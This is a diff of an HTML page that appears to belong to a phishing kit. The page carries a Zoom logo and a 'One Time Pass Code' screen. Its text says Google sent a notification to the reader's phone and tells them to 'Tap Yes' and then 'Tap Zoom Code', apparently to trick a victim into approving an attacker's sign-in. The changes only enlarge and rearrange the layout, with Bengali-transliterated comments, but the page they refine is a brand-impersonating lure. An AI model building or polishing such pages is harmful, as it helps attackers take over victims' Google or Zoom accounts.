@@ -17,65 +17,76 @@
 
     html, body {
       width: 100%;
-      min-height: 100vh;
+      height: 100vh;
       background-color: #ffffff;
       color: #202124;
       display: flex;
       justify-content: center;
       align-items: center;
+      overflow: hidden;
     }
 
     .container {
       width: 100%;
-      max-width: 360px;
+      max-width: 380px;
+      height: 100vh;
+      max-height: 720px;
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: space-between; /* Sob jayga fill kore upore o niche properly spread korbe */
       text-align: center;
-      padding: 20px 16px;
+      padding: 24px 16px;
       background: #ffffff;
+    }
+
+    /* Top Content Section */
+    .content-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
     }
 
     /* Top Logo */
     .logo {
-      width: 55px;
-      height: 55px;
+      width: 60px;
+      height: 60px;
       object-fit: contain;
-      margin-bottom: 8px;
+      margin-bottom: 12px;
       border-radius: 50%;
     }
 
     /* Main Title */
     h1 {
-      font-size: 20px;
+      font-size: 22px;
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 10px;
+      margin-bottom: 16px;
     }
 
-    /* Phone Graphic Illustration */
+    /* Phone Graphic Illustration (Aro boro kora holo) */
     .phone-illustration {
-      width: 160px; 
+      width: 200px; 
       height: auto;
       object-fit: contain;
-      margin-bottom: 10px;
+      margin-bottom: 16px;
     }
 
     /* Sub Heading */
     h2 {
-      font-size: 18px;
+      font-size: 19px;
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 6px;
+      margin-bottom: 8px;
     }
 
     /* Description Text */
     .desc-text {
-      font-size: 14.5px;
+      font-size: 15px;
       font-weight: 600;
       color: #1f2937;
       line-height: 1.5;
-      margin-bottom: 20px;
     }
 
     .desc-text span {
@@ -83,20 +94,21 @@
       color: #000000;
     }
 
-    /* Resend Button */
+    /* Resend Button (Ekdom nicher dike thakbe) */
     .btn-join {
       background-color: #007aff;
       color: white;
-      padding: 13px 0;
+      padding: 14px 0;
       width: 90%;
-      max-width: 280px;
-      font-size: 15px;
+      max-width: 300px;
+      font-size: 16px;
       font-weight: bold;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
-      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.2);
+      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);
       transition: background-color 0.2s, transform 0.1s;
+      margin-top: auto;
     }
 
     .btn-join:hover {
@@ -111,15 +123,17 @@
 <body>
 
   <div class="container">
-    <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
-    <h1>One Time Pass Code</h1>
-    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
-    <h2>Check your phone.</h2>
-    <p class="desc-text">
-      Google sent a notification to your phone.<br>
-      <span>Tap Yes</span> on the notification<br>
-      Then Tap Zoom Code
-    </p>
+    <div class="content-box">
+      <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
+      <h1>One Time Pass Code</h1>
+      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
+      <h2>Check your phone.</h2>
+      <p class="desc-text">
+        Google sent a notification to your phone.<br>
+        <span>Tap Yes</span> on the notification<br>
+        Then Tap Zoom Code
+      </p>
+    </div>
 
     <button class="btn-join" onclick="window.location.href='../'">Resend</button>
   </div>
